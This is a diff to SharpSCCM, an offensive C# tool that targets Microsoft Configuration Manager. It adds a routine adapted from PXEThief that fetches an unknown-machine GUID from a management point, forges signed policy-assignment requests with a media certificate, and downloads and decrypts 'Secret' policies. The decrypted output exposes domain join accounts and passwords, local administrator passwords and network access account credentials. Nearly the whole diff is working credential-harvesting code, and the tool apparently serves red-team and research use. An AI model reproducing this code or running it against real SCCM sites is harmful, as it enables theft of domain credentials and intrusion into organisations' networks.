@@ -7,6 +7,7 @@ using System.Security.Cryptography.Pkcs;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Xml;
+using System.Runtime.InteropServices;
 
 // Configuration Manager SDK
 using Microsoft.ConfigurationManagement.Messaging.Framework;
@@ -71,7 +72,7 @@ namespace SharpSCCM
             {
                 Console.WriteLine("[!] Could not decrypt the secret policy");
                 return null;
-            }         
+            }
         }
 
         public static void DeleteCertificate(MessageCertificateX509 certificate)
@@ -87,19 +88,42 @@ namespace SharpSCCM
 
         }
 
-        public static (MessageCertificateX509, MessageCertificateX509, SmsClientId) GetCertsAndClientId(string managementPoint = null, string siteCode = null, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null)
+        public static (MessageCertificateX509, MessageCertificateX509, SmsClientId) GetCertsAndClientId(string managementPoint = null, string siteCode = null, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string encodedCertPassword = null)
         {
             MessageCertificateX509 signingCertificate = null;
             MessageCertificateX509 encryptionCertificate = null;
             SmsClientId clientId = null;
-           
+
             if (!string.IsNullOrEmpty(encodedCertificate) && !string.IsNullOrEmpty(providedClientId))
             {
-                Console.WriteLine($"[+] Using provided certificate and SMS client ID: {providedClientId}");
-                X509Certificate2 certificateToImport = new X509Certificate2(Helpers.StringToByteArray(encodedCertificate), string.Empty, X509KeyStorageFlags.Exportable);
-                signingCertificate = new MessageCertificateX509Volatile(certificateToImport);
-                encryptionCertificate = signingCertificate;
-                clientId = new SmsClientId(providedClientId);
+                encodedCertPassword = (encodedCertPassword != null) ? encodedCertPassword : string.Empty;
+                try
+                {
+                    X509Certificate2 certificateToImport = new X509Certificate2(Helpers.StringToByteArray(encodedCertificate), encodedCertPassword, X509KeyStorageFlags.Exportable);
+                    Console.WriteLine($"[+] Using provided certificate and SMS client ID: {providedClientId}");
+                    signingCertificate = new MessageCertificateX509Volatile(certificateToImport);
+                    encryptionCertificate = signingCertificate;
+                    clientId = new SmsClientId(providedClientId);
+                }
+                catch (Exception ex)
+                {
+                    string szEncodedCertIdentifier = $"Encoded String:{encodedCertificate.Substring(0, 10)}";
+                    if (ex.ToString().Contains("network password is not correct"))
+                    {
+                        if (encodedCertPassword == String.Empty)
+                        {
+                            Console.WriteLine($"[-] Provided encoded certificate ({szEncodedCertIdentifier}...) requires a password.");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[-] Provided password for encoded certificate ({szEncodedCertIdentifier}...) is not correct.");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[-] Error while importing encoded certificate ({szEncodedCertIdentifier}...)");
+                    }
+                }
             }
             else if (string.IsNullOrEmpty(registerClient))
             {
@@ -130,13 +154,13 @@ namespace SharpSCCM
                 }
                 signingCertificate = CreateUserCertificate(null, false);
                 encryptionCertificate = signingCertificate;
-                string authenticationType = (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password)) ? "Windows": null;
+                string authenticationType = (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password)) ? "Windows" : null;
                 clientId = RegisterClient(signingCertificate, registerClient, managementPoint, siteCode, authenticationType, username, password);
             }
             return (signingCertificate, encryptionCertificate, clientId);
         }
 
-        public static async void GetSecretsFromPolicy(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
+        public static async void GetSecretsFromPolicies(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
         {
             // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
             // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
@@ -148,69 +172,130 @@ namespace SharpSCCM
                 // Send request for policy assignments to obtain policy locations
                 ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
 
-                // Get secret policies
-                string outputFull = "";
-                string outputCreds = "";
                 foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
                 {
-                    if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
+                    GetSecretsFromPolicy(policyAssignment, managementPoint, clientId, encryptionCertificate, outputPath);
+                }
+            }
+        }
+        public static async void GetSecretsFromPolicy(PolicyAssignment policyAssignment, string managementPoint, SmsClientId clientId, MessageCertificateX509 encryptionCertificate, string outputPath = null)
+        {
+
+            // Get secret policies
+            string outputFull = "";
+            string outputCredsDecrypted = "";
+            string outputCredsEncrypted = "";
+            if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
+            {
+                Console.WriteLine("[+] Found policy containing secrets:");
+                Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
+                Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
+                Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");
+
+                // Can't figure out how to authenticate with the SDK so using raw HTTP requests
+                string decryptedPolicyBody = null;
+                HttpResponseMessage policyDownloadResponse = null;
+                try
+                {
+                    string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
+                    policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId, encryptionCertificate);
+                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
+                    Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
+                }
+                catch
+                {
+                    Console.WriteLine($"      Failed to download :/");
+                    return;
+                }
+                if (policyDownloadResponse != null)
+                {
+                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
+                    try
                     {
-                        Console.WriteLine("[+] Found policy containing secrets:");
-                        Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
-                        Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
-                        Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");
-
-                        // Can't figure out how to authenticate with the SDK so using raw HTTP requests
-                        string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
-                        HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), encryptionCertificate);
-                        byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
-                        Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
-                        string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
-                        if (decryptedPolicyBody != null)
-                        {
-                            outputFull += decryptedPolicyBody;
-                            XmlDocument policyXmlDoc = new XmlDocument();
-                            policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
-                            XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
-                            foreach (XmlNode propertyNode in propertyNodeList)
-                            {
-                                if (propertyNode.Attributes["secret"] != null)
-                                {
-                                    outputCreds += $"{propertyNode.Attributes["name"].Value}: {propertyNode.InnerText.Trim()}\n\n";
-                                }
-                            }
-                        }
-
-                        /*
-                        // Code borrowed from SetCustomHeader method, exception on Decrypt method
-                        ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
-                        Dictionary<string, object> senderProperty = (Dictionary<string, object>)policyDownloadRequest.Settings.SenderProperties["HttpSender", "HttpHeaders"];
-                        string clientTokenHeader = $"{clientId};{TimeHelpers.CurrentTimeAsIso8601};2";
-                        senderProperty["ClientToken"] = clientTokenHeader;
-                        senderProperty["ClientTokenSignature"] = certificate.Sign(clientTokenHeader + "\0", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
-                        policyDownloadRequest.DownloadSecrets = true;
-                        ConfigMgrPolicyBodyDownloadReply policyBodyDownloadReply = policyDownloadRequest.SendMessage(sender);
-                        */
+                        decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
+                    }
+                    catch
+                    {
+                        Console.WriteLine($"[-] Error while trying to decrypt policy response :/...");
                     }
                 }
+                if (decryptedPolicyBody != null)
+                {
+                    outputFull += decryptedPolicyBody;
+                    XmlDocument policyXmlDoc = new XmlDocument();
+                    policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
+                    Helpers.DecompressXMLNodes(policyXmlDoc);
+                    XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
+                    bool bIsUnnamedVariable = false;
+                    string szAdditionalVarAttributes = "";
+                    foreach (XmlNode propertyNode in propertyNodeList)
+                    {
+                        if (propertyNode.Attributes["secret"] != null)
+                        {
+                            string szSecretName = propertyNode.Attributes["name"].Value;
+                            string szSecretValue = propertyNode.InnerText.Trim();
+                            string szDecData;
+                            bool bDecryptSuccess = Helpers.DecryptDESSecret(szSecretValue, out szDecData);
 
-                if (!string.IsNullOrEmpty(outputPath))
-                {
-                    File.WriteAllText(outputPath, outputFull);
-                    Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
-                }
+                            if (szSecretName == "TS_Sequence")
+                            {
+                                XmlDocument tsSequenceDoc = new XmlDocument();
+                                tsSequenceDoc.LoadXml(szDecData.Replace("\0", "").Trim());
+                                Helpers.DecompressXMLNodes(policyXmlDoc);
+                                // search for 'OSDLocalAdminPassword', 'OSDDomainName', 'OSDJoinPassword', 'OSDJoinAccount', 'OSDRegisteredUserName', 'OSDRegisteredOrgName'
+                                XmlNodeList osdLocalAdminPWNodes = tsSequenceDoc.SelectNodes("//variable[@name='OSDLocalAdminPassword' or @name='OSDDomainName' or @name='OSDJoinPassword' or @name='OSDJoinAccount' or @name='OSDRegisteredUserName' or @name='OSDRegisteredOrgName']");
+                                foreach (XmlNode variableNode in osdLocalAdminPWNodes)
+                                {
+                                    string szVariableName = variableNode.Attributes["name"].Value;
+                                    outputCredsDecrypted += $"TaskSequence variable '{szVariableName}': {variableNode.InnerText}\n";
+                                }
+                            }
+                            if (szSecretName == "Value")
+                            {
+                                bIsUnnamedVariable = true;
+                            }
 
-                if (!string.IsNullOrEmpty(outputCreds))
-                {
-                    Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCreds.TrimEnd()}\n");
-                    // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
-                    Console.WriteLine("[+] Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
+                            if (bDecryptSuccess)
+                            {
+                                outputCredsDecrypted += $"{szSecretName}: {szDecData}\n";
+                            }
+                            else
+                            {
+                                outputCredsEncrypted += $"{szSecretName}: {szSecretValue}\n";
+                            }
+                        }
+                        else
+                        {
+                            string szPropertyName = propertyNode.Attributes["name"].Value;
+                            string szPropertyType = propertyNode.Attributes["type"].Value;
+                            string szPropertyValue = propertyNode.InnerText.Trim();
+                            szAdditionalVarAttributes += $"Propery '{szPropertyName}': {szPropertyValue} (Type: {szPropertyType})\n";
+                        }
+                    }
+                    if (bIsUnnamedVariable)
+                    {
+                        // adding additional information to credentials
+                        outputCredsDecrypted += szAdditionalVarAttributes;
+                    }
                 }
-                else
-                {
-                    Console.WriteLine($"[+] No secret policies were found, which could result from using an unapproved device for policy retrieval\n" +
-                        "[+] Try creating a new approved device by specifying a computer account (-u) and password (-p)");
-                }
+            }
+
+
+            if (!string.IsNullOrEmpty(outputPath))
+            {
+                File.WriteAllText(outputPath, outputFull);
+                Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
+            }
+
+            if (!string.IsNullOrEmpty(outputCredsDecrypted))
+            {
+                Console.WriteLine($"[+] Decrypted secrets:\n\n{outputCredsDecrypted.TrimEnd()}\n");
+            }
+            if (!string.IsNullOrEmpty(outputCredsEncrypted))
+            {
+                Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCredsEncrypted.TrimEnd()}\n");
+                // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
+                Console.WriteLine("[+] Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
             }
         }
 
@@ -299,6 +384,7 @@ namespace SharpSCCM
 
         public static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
         {
+            HttpSender.AllowProxyTraversal = true;
             HttpSender sender = new HttpSender();
             // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
             ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();
@@ -383,6 +469,7 @@ namespace SharpSCCM
 
         public static ConfigMgrPolicyAssignmentReply SendPolicyAssignmentRequest(SmsClientId clientId, MessageCertificateX509 certificate, string managementPoint, string siteCode)
         {
+            HttpSender.AllowProxyTraversal = true;
             HttpSender sender = new HttpSender();
             ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
             // Sign message with the certificate associated with the SmsId
@@ -396,25 +483,363 @@ namespace SharpSCCM
             return assignmentReply;
         }
 
-        public static HttpResponseMessage SendPolicyDownloadRequest(string url, string clientId = null, MessageCertificateX509 certificate = null)
+        public static string SendHTTPRequest(string url, string httpMethod, string contentType, string data, WebProxy proxy = null)
         {
-            HttpClientHandler httpClientHandler = new HttpClientHandler() { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate };
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            if (proxy != null)
+                request.Proxy = proxy;
+            request.Method = httpMethod;
+            request.ContentType = contentType;
+
+            if (data != null)
+            {
+                byte[] byteData = Encoding.UTF8.GetBytes(data);
+                request.ContentLength = byteData.Length;
+                using (Stream postStream = request.GetRequestStream())
+                {
+                    postStream.Write(byteData, 0, byteData.Length);
+                }
+            }
+
+            using (WebResponse response = request.GetResponse())
+            {
+                using (Stream responseStream = response.GetResponseStream())
+                {
+                    StreamReader reader = new StreamReader(responseStream, Encoding.UTF8);
+                    return reader.ReadToEnd();
+                }
+            }
+        }
+
+        public static async void SendPolicyAssignmentRequestWithExplicitData(string machineGUID, string szMediaGUID, string szEncodedSigningCert, string szMPHostname, string szSiteCode, string szHTTPProxyAddress = null)
+        {
+            HttpClientHandler httpClientHandler = new HttpClientHandler() { };
+            if (szHTTPProxyAddress != null)
+            {
+                httpClientHandler.Proxy = new WebProxy(szHTTPProxyAddress);
+                httpClientHandler.UseProxy = true;
+            }
+            HttpClient httpClient = new HttpClient(httpClientHandler);
+            //
+            // Prepare Arguments
+            //
+            if (machineGUID == null)
+            {
+                // Query MP for
+                Console.WriteLine($"[*] ClientID not given, querying for MP at 'http://{szMPHostname}/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA' for GUIDs for unknown machines...");
+                HttpResponseMessage response = null;
+                try
+                {
+                    response = httpClient.GetAsync($"http://{szMPHostname}/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA").Result;
+                }
+                catch (Exception ex)
+                {
+                    if (ex.InnerException.Message == "A task was canceled.")
+                    {
+                        Console.WriteLine($"[-] Request timed out after '{httpClient.Timeout.TotalSeconds}' seconds...");
+                        if (httpClientHandler.UseProxy)
+                        {
+                            Console.WriteLine($"    A web proxy was used, maybe there is an issue with that.");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Error while waiting for response");
+                        Console.WriteLine("--- Error Message ---");
+                        Console.WriteLine($"{ex}");
+                        Console.WriteLine("--- Error Message End ---");
+                    }
+                }
+                if (response != null)
+                {
+                    string xmlResponse = await response.Content.ReadAsStringAsync();
+                    var xmlResponseDoc = new XmlDocument();
+                    xmlResponseDoc.LoadXml(xmlResponse);
+
+                    // Use xmlDoc to parse and manipulate the XML data
+                    XmlNodeList nodeList = xmlResponseDoc.SelectNodes("//UnknownMachines");
+                    foreach (XmlNode node in nodeList)
+                    {
+                        string szUnknownGUIDX64 = node.Attributes["x64UnknownMachineGUID"].Value;
+                        if (szUnknownGUIDX64 != null)
+                        {
+                            machineGUID = szUnknownGUIDX64;
+                            break;
+                        }
+                        string szUnknownGUIDX86 = node.Attributes["x86UnknownMachineGUID"].Value;
+                    }
+                }
+                if (machineGUID != null)
+                {
+                    Console.WriteLine($"[*] Using ClientID: {machineGUID}...");
+                }
+                else
+                {
+                    Console.WriteLine($"[-] Could not find ClientID. Exiting...");
+                    return;
+                }
+
+            }
+            // some parts require a GUID with curly brackets, some without
+            string szMachineGUIDPlain = machineGUID.Trim(new char[] { '{', '}' });
+            string szMachineGUIDCurlyBrackets = $"{{{szMachineGUIDPlain}}}";
+            string szMediaGUIDPlain = szMediaGUID.Trim(new char[] { '{', '}' });
+            string szMediaGUIDCurlyBrackets = $"{{{szMediaGUIDPlain}}}";
+
+            (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptioncertificate, SmsClientId _) = GetCertsAndClientId(null, null, szEncodedSigningCert, machineGUID, null, null, null, szMediaGUIDCurlyBrackets.Substring(0, 31));
+            if (signingCertificate == null)
+            {
+                return;
+            }
+
+            //
+            // Build Signature
+            //
+            string szCurrentTimeAsIso = TimeHelpers.CurrentTimeAsIso8601;
+            string szClientToken = $"{szMediaGUIDCurlyBrackets};{szCurrentTimeAsIso}";
+            byte[] abyClientTokenUnicodeBytes = Encoding.Unicode.GetBytes(szClientToken);
+
+            byte[] abyClientTokenSignature = signingCertificate.Sign(abyClientTokenUnicodeBytes, "SHA-256", MessageCertificateSigningOptions.CryptNoHashId);
+            string szClientTokenSignature = BitConverter.ToString(abyClientTokenSignature).Replace("-", "");
+
+            //
+            // Build Request
+            //
+            httpClient = new HttpClient(httpClientHandler);
+            httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
+            httpClient.DefaultRequestHeaders.ExpectContinue = false;
+
+            var requestNew = new HttpRequestMessage(new HttpMethod("CCM_POST"), $"http://{szMPHostname}/ccm_system/request");
+
+            // Set the content type header
+            System.Net.Http.Headers.MediaTypeHeaderValue contentType = new System.Net.Http.Headers.MediaTypeHeaderValue("multipart/mixed");
+            var boundaryNew = "------------" + DateTime.Now.Ticks.ToString("x");
+            contentType.Parameters.Add(new System.Net.Http.Headers.NameValueHeaderValue("boundary", boundaryNew));
+            // Create the multipart content
+            MultipartContent multipartContent = new MultipartFormDataContent(boundaryNew);
+            multipartContent.Headers.ContentType = contentType;
+            //
+            // Add first payload 
+            // https://github.com/MWR-CyberSec/PXEThief/blob/main/pxethief.py#L712
+            // 
+            byte[] payload_request1 = Encoding.Unicode.GetBytes(
+                $@"<Msg ReplyCompression=""none""><ID/><SourceID>{szMachineGUIDPlain}</SourceID>" +
+                @"<ReplyTo>direct:OSD</ReplyTo>" +
+                @"<Body Type=""ByteRange"" Offset=""0"" Length=""728""/>" +
+                @"<Hooks><Hook2 Name=""clientauth""><Property Name=""Token"">" +
+                $@"<![CDATA[ClientToken:{szClientToken}{"\r"}{"\n"}ClientTokenSignature:{szClientTokenSignature}{"\r"}{"\n"}]]>" +
+                @"</Property></Hook2></Hooks>" +
+                @"<Payload Type=""inline""/>" +
+                @"<TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>"
+            );
+            byte[] dataPayloadField1 = new byte[2 + payload_request1.Length];
+            dataPayloadField1[0] = 0xFF;
+            dataPayloadField1[1] = 0xFE;
+            Array.Copy(payload_request1, 0, dataPayloadField1, 2, payload_request1.Length);
+            ByteArrayContent payloadField1 = new ByteArrayContent(dataPayloadField1);
+
+            System.Net.Http.Headers.ContentDispositionHeaderValue headerContentDispositionField1 = new System.Net.Http.Headers.ContentDispositionHeaderValue("form-data");
+            headerContentDispositionField1.Name = @"""Msg""";
+            System.Net.Http.Headers.MediaTypeHeaderValue headerContentTypeField1 = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
+            headerContentTypeField1.CharSet = "UTF-16";
+
+            payloadField1.Headers.ContentDisposition = headerContentDispositionField1;
+            payloadField1.Headers.ContentType = headerContentTypeField1;
+            multipartContent.Add(payloadField1);
+
+            //
+            // Add second payload 
+            // https://github.com/MWR-CyberSec/PXEThief/blob/main/pxethief.py#L713
+            // 
+            byte[] payload_request2 = Encoding.Unicode.GetBytes(
+                @"<RequestAssignments SchemaVersion=""1.00"" RequestType=""Always"" Ack=""False"" ValidationRequested=""CRC"">" +
+                $@"<PolicySource>SMS:{szSiteCode}</PolicySource><ServerCookie/><Resource ResourceType=""Machine""/>" +
+                $@"<Identification><Machine><ClientID>{szMachineGUIDPlain}</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification>" +
+                $"</RequestAssignments>\r\n"
+            );
+            byte[] dataPayloadField2 = new byte[payload_request1.Length + 3];
+            Array.Copy(payload_request2, 0, dataPayloadField2, 0, payload_request2.Length);
+            Array.Copy(new byte[] { 0x00, 0x00, 0x00 }, 0, dataPayloadField2, payload_request2.Length, 3);
+
+            ByteArrayContent payloadField2 = new ByteArrayContent(dataPayloadField2);
+            System.Net.Http.Headers.ContentDispositionHeaderValue headerContentDispositionField2 = new System.Net.Http.Headers.ContentDispositionHeaderValue("form-data");
+            headerContentDispositionField2.Name = @"""RequestAssignments""";
+            payloadField2.Headers.ContentDisposition = headerContentDispositionField2;
+
+            //
+            // Finalize and send request
+            //
+            multipartContent.Add(payloadField2);
+            requestNew.Content = multipartContent;
+
+            httpClient.Timeout = TimeSpan.FromSeconds(5); // set a 5 second timeout
+            HttpResponseMessage assignmentResponse = null;
+            try
+            {
+                assignmentResponse = httpClient.SendAsync(requestNew).Result;
+            }
+            catch (Exception ex)
+            {
+                if (ex.InnerException.Message == "A task was canceled.")
+                {
+                    Console.WriteLine($"[-] Request timed out after '{httpClient.Timeout.TotalSeconds}' seconds...");
+                    if (httpClientHandler.UseProxy)
+                    {
+                        Console.WriteLine($"    A web proxy was used, maybe there is an issue with that.");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("[-] Error while waiting for response");
+                    Console.WriteLine("--- Error Message ---");
+                    Console.WriteLine($"{ex}");
+                    Console.WriteLine("--- Error Message End ---");
+                }
+            }
+
+            if (assignmentResponse != null && assignmentResponse.IsSuccessStatusCode)
+            {
+                if (assignmentResponse.Content.Headers.ContentLength == 0)
+                {
+                    Console.WriteLine("[-] Empty server response. This usually means the ClientID or signature is invalid (invalid/wrong certificate).");
+                    return;
+                }
+                XmlNodeList policyAssignmentNodeList = null;
+                try
+                {
+                    MultipartMemoryStreamProvider multipartContentProvider = assignmentResponse.Content.ReadAsMultipartAsync().Result;
+                    HttpContent multiPart1Content = multipartContentProvider.Contents[1];
+                    byte[] multiPart1ByteContents = multiPart1Content.ReadAsByteArrayAsync().Result;
+
+                    string multiPart1StrContents = Encoding.ASCII.GetString(Encoding.Convert(Encoding.Unicode, Encoding.ASCII, multiPart1ByteContents));
+                    XmlDocument policyAssignmentsXmlDoc = new XmlDocument();
+                    policyAssignmentsXmlDoc.LoadXml(multiPart1StrContents.Trim());
+                    policyAssignmentNodeList = policyAssignmentsXmlDoc.GetElementsByTagName("PolicyAssignment");
+                    Console.WriteLine($"[+] Found {policyAssignmentNodeList.Count} Policy Assignments!");
+
+                }
+                catch (Exception ex)
+                {
+                    string response = $"{assignmentResponse.Headers}\n\n{assignmentResponse.Content.ReadAsStringAsync().Result}";
+                    Console.WriteLine("[-] Reply does not contain Policy Assignments. Received the following:");
+                    Console.WriteLine("--- Response ---");
+                    Console.WriteLine($"{response}");
+                    Console.WriteLine($"--- Response End ---");
+                }
+                if (policyAssignmentNodeList != null)
+                {
+                    foreach (XmlNode policyAssignmentNode in policyAssignmentNodeList)
+                    {
+                        XmlNodeList policyNodeList = policyAssignmentNode.SelectNodes("Policy");
+                        foreach (XmlNode policyNode in policyNodeList)
+                        {
+                            //XmlAttributeCollection nodeAttributes = policyNode.Attributes;
+                            PolicyAssignment policyAssignment = new PolicyAssignment();
+                            policyAssignment.Policy = new PolicyAssignmentPolicy();
+                            if (policyNode.Attributes["PolicyID"] != null)
+                            {
+                                policyAssignment.Policy.Id = policyNode.Attributes["PolicyID"].Value; ;
+                            }
+                            if (policyNode.Attributes["PolicyVersion"] != null)
+                            {
+                                policyAssignment.Policy.Version = policyNode.Attributes["PolicyVersion"].Value;
+                            }
+                            if (policyNode.Attributes["PolicyCategory"] != null)
+                            {
+                                policyAssignment.Policy.Category = policyNode.Attributes["PolicyCategory"].Value;
+                            }
+                            if (policyNode.Attributes["PolicyFlags"] != null)
+                            {
+                                string szPolicyFlags = policyNode.Attributes["PolicyFlags"].Value;
+                                int iPolicyFlags;
+                                if (int.TryParse(szPolicyFlags, out iPolicyFlags))
+                                {
+                                    policyAssignment.Policy.Flags = (PolicyAssignmentFlags)iPolicyFlags;
+                                }
+                            }
+                            XmlNode policyLocationNode = policyNode.SelectSingleNode("PolicyLocation");
+                            if (policyLocationNode != null)
+                            {
+                                //string policyLocation = policyLocationNode.InnerText;
+                                PolicyAssignmentLocation policyLocation = new PolicyAssignmentLocation();
+                                policyLocation.Value = policyLocationNode.InnerText;
+                                if (policyLocationNode.Attributes["PolicyHash"] != null)
+                                {
+                                    policyLocation.Hash = policyLocationNode.Attributes["PolicyHash"].Value;
+                                }
+                                if (policyLocationNode.Attributes["PolicyHashEx"] != null)
+                                {
+                                    policyLocation.HashEx = policyLocationNode.Attributes["PolicyHashEx"].Value;
+                                }
+                                policyAssignment.Policy.Location = policyLocation;
+                            }
+
+                            GetSecretsFromPolicy(policyAssignment, szMPHostname, new SmsClientId(szMediaGUIDPlain), encryptioncertificate);
+                        }
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("[-] Server response error. Corrupt/Invalid request data?");
+                return;
+            }
+        }
+
+        public static HttpResponseMessage SendPolicyDownloadRequest(string url, SmsClientId clientId = null, MessageCertificateX509 certificate = null)
+        {
+            HttpClientHandler httpClientHandler = new HttpClientHandler()
+            {
+                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
+            };
+            /* Not yet implemented
+            if (szHTTPProxyAddress != null)
+            {
+                httpClientHandler.Proxy = new WebProxy(szHTTPProxyAddress);
+                httpClientHandler.UseProxy = true;
+            }
+            */
             HttpClient httpClient = new HttpClient(httpClientHandler);
             httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
             var request = new HttpRequestMessage(HttpMethod.Get, url);
             // Add authentication headers required to download policies flagged "Secret"
-            if (!string.IsNullOrEmpty(clientId) && (certificate != null))
+            if (!string.IsNullOrEmpty(clientId.ToString()) && (certificate != null))
             {
-                string currentTimeAsIso = TimeHelpers.CurrentTimeAsIso8601;
-                string clientTokenHeader = $"{clientId};{currentTimeAsIso};2";
-                httpClient.DefaultRequestHeaders.Add("ClientToken", clientTokenHeader);
-                byte[] clientTokenHeaderBytes = Encoding.Unicode.GetBytes(clientTokenHeader + "\0");
-                string clientTokenSignatureHeader = certificate.Sign(clientTokenHeaderBytes, "SHA256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
+                // client GUID
+                string clientGUIDStr = $"{clientId.ToString().Replace("GUID:", "")}";
+                string clientGUIDBracketStr = $"{{{clientGUIDStr}}}"; // Form: {XXXXXXXX-XXXX-XXXX-...}
+                // Timestamp
+                string CCMClientTimestamp = TimeHelpers.CurrentTimeAsIso8601;
+                // sign ClientToken
+                string ClientToken = $"{clientGUIDBracketStr};{CCMClientTimestamp}";
+                byte[] ClientTokenBytes = Encoding.Unicode.GetBytes(ClientToken);
+                string ClientTokenBytesSignature = "";
+                try
+                {
+                    ClientTokenBytesSignature = certificate.Sign(ClientTokenBytes, "SHA-256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
+                }
+                catch (Exception ex)
+                {
+                    if (ex.ToString().Contains("does not support the specified algorithm"))
+                    {
+                        // Depending on the certificate the algo is sometimes referred to as "SHA-256" or "SHA256"
+                        // This seems to also affect how the signature is generated... this is the workaround for that
+                        ClientToken = $"{clientId};{CCMClientTimestamp}";
+                        byte[] clientTokenHeaderBytes = Encoding.Unicode.GetBytes(ClientToken + "\0");
+                        ClientTokenBytesSignature = certificate.Sign(clientTokenHeaderBytes, "SHA256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
+                    }
+                    else
+                    {
+                        throw ex;
+                    }
+                }
+                // Add Client Headers
                 Console.WriteLine("[+] Adding authentication headers to download request:\n" +
-                                  $"      ClientToken: {clientTokenHeader}\n" +
-                                  $"      ClientTokenSignature: {clientTokenSignatureHeader}"
+                                  $"      ClientToken: {ClientToken}\n" +
+                                  $"      ClientTokenSignature: {ClientTokenBytesSignature}"
                                   );
-                httpClient.DefaultRequestHeaders.Add("ClientTokenSignature", clientTokenSignatureHeader);
+                httpClient.DefaultRequestHeaders.Add("ClientToken", ClientToken);
+                httpClient.DefaultRequestHeaders.Add("ClientTokenSignature", ClientTokenBytesSignature);
             }
             var response = httpClient.SendAsync(request).Result;
             return response;
